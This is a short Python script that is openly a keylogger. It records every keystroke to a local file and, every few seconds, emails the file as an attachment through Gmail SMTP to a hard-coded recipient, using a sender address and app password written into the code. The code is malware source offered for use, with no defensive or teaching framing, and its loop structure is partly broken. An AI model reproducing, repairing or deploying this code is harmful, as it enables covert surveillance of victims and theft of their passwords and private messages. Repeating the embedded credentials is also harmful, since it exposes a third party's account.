import smtplib
import time
import schedule
from pynput import keyboard  # logger
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import threading

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")


fromaddr = "muneawr@gmail.com"
toaddr = "munawarp.pa@gmail.com"

def mail():
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger:"
    body = "KeyLogger"

    msg.attach(MIMEText(body, 'plain'))
    filename1 = "keyfile.txt"
    attachment1 = open("keyfile.txt", "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment1).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename1)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "utoiaduiuotrprfn")
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()
    print("mailing done")

schedule.every(10).seconds.do(mail)
     
while True:
    schedule.run_pending()
    time.sleep(20)

    def keylog():
        listener = keyboard.Listener(on_press=keyPressed)
        listener.start()

    if __name__ == "__main__":
        t1 = threading.Thread(target=keylog)
        t2 = threading.Thread(target=mail)
        t1.start()
        t2.start()

        t1.join()
        t2.join()
